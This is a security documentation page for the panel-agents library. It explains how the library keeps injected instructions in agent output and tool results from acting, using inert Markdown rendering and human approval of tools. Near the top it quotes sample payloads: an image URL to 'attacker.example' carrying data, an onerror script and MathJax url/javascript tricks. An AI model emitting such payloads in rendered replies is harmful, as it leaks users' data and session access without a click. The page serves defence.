# Security

An agent reads text that other people wrote: documents, web pages, data, tool results. Any of it can contain instructions aimed at the model, so treat what the model writes, and what tools return, as untrusted. panel-agents is built so that such text cannot act on its own, and so that a person decides what the agent may do.

## Rendered output loads and runs nothing by itself

A reply containing `![chart](https://attacker.example/?d=...)` or `<img src="..." onerror="...">` would make the browser fetch that URL, or run that script, as soon as the reply is shown. Data the agent saw could leave in the URL, or the script could act in the app with the user's session, without anyone clicking. TeX is no safer: MathJax's `\style{...url()}` and `\href{javascript:...}` load and run things too.

panel-agents therefore renders every piece of untrusted text through the `panel_agents.security.inert_markdown` markdown-it plugin, with math disabled both on the server and in the browser. That covers chat messages, thinking, text tool results and `text` or `markdown` artifacts. The plugin works on the parsed tokens, the same ones that are rendered, so nothing in the source can hide from it:

- Raw HTML is shown as text. This covers `<img>`, `<iframe>`, `srcset`, `<base>`, `<meta>`, inline styles with `url()` and any other element that loads or runs something.
- Markdown images become links labelled "image: ...", which only fetch when someone opens them. Inline raster `data:image/...` images are kept, since they load nothing.
- Links are limited to http, https, mailto and relative URLs, and every link shows its full URL next to its text, so a link cannot pretend to go elsewhere.
- `$$...$$` is shown as text, never typeset.

Short strings that come from the model, a tool or another user are shown as plain text, never as Markdown or HTML: artifact titles, tool names and descriptions (which a third-party MCP server controls), argument field titles and help, approval reasons, user names and error messages. Values a renderer does not know, such as an object with a `_repr_html_`, are shown with `str()` instead of their HTML.

If your agent shows images from sources you trust, such as your own map tiles or chart service, allow their origins once at startup:

```python
from panel_agents.security import set_trusted_image_origins

set_trusted_image_origins(["https://tiles.example.com"])
```

`"*"` allows images from any http or https origin. Raw HTML stays text either way.

A custom renderer registered with `register_renderer` decides how its kind is shown. If it returns a string, that string is rendered inert. If it builds Panel objects from untrusted text, use `untrusted_markdown(text)` for Markdown, or pass `plugins=[inert_markdown], disable_math=True` to your own Markdown pane. Note that `pn.pane.Markdown` alone does not stop MathJax in the browser; `untrusted_markdown` does.

## A person decides what runs

- Tools that change things should need approval. Declare it with an `ApprovalPolicy` rather than relying on the model to ask; see [approvals](approvals.md).
- Who may approve is enforced where the decision takes effect, not only in the card. Edited arguments are checked against the rules too, and each request is decided once.
- Over MCP, approvals are bound to the call they were asked for, and rules that restrict approvers need an authenticated caller; see [MCP](mcp.md).
- Front-end actions run with the permissions of the session they belong to. Give the agent the same actions the user has, no more.

## Recordings contain what the agent saw

Recordings and audit logs store tool arguments, results and artifacts as they were. Keep them where the data they contain may be kept.
